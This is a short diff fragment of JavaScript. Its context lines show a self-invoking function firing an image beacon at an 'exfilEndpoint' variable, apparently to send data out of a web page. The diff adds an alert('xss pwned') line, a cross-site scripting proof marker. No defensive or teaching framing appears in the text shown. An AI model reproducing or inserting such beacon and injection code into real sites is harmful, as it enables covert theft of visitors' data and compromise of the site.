@@ -7,3 +7,6 @@
     const beacon = new Image();
     beacon.src = exfilEndpoint;
 })();
+
+
+alert("xss pwned")
